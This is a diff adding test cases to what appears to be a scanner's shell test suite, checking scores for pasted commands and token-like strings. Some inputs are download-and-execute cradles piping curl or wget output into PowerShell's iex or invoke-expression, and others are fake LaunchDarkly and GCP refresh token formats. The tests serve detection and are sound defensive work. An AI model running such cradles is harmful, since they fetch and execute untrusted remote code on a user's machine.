@@ -23485,6 +23485,18 @@ jcheck "secret: secret_ short benign" 'd["score"] == 0' secret 'secret_short'
 jcheck "secret: secret_ underscores benign" 'd["score"] == 0' secret 'secret_token_value_here'
 jcheck "secret: secret_sauce benign" 'd["score"] == 0' secret 'secret_sauce'
 
+# ── cycle-521: | iex pipe + LaunchDarkly/GCP-refresh secrets ───────────
+jcheck "paste: curl|iex cradle flagged" 'd["score"] == 40' paste 'curl http://e/x | iex'
+jcheck "paste: invoke-expression pipe flagged" 'd["score"] >= 80' paste 'wget -q http://e/p | invoke-expression'
+jcheck "secret: launchdarkly sdk uuid flagged" 'd["score"] == 80' secret 'sdk-'3fa85f64-5717-4562-b3fc-2c963f66afa6
+jcheck "secret: launchdarkly mob flagged" 'd["score"] == 80' secret 'mob-'3fa85f64-5717-4562-b3fc-2c963f66afa6
+jcheck "secret: launchdarkly api flagged" 'd["score"] == 80' secret 'api-'3fa85f64-5717-4562-b3fc-2c963f66afa6
+jcheck "secret: gcp refresh 1// flagged" 'd["score"] == 85' secret '1//'0gXYZabc_def-1234567890AbCdEfGhIjKlMnOpQrStUvWxYz012345
+jcheck "secret: sdk-version benign" 'd["score"] == 0' secret 'sdk-version 1.2'
+jcheck "secret: api-tokens benign" 'd["score"] == 0' secret 'api-tokens list'
+jcheck "secret: 1//0 bare benign" 'd["score"] == 0' secret '1//0'
+jcheck "paste: pipe json_pp benign" 'd["score"] == 0' paste 'curl http://e | json_pp'
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
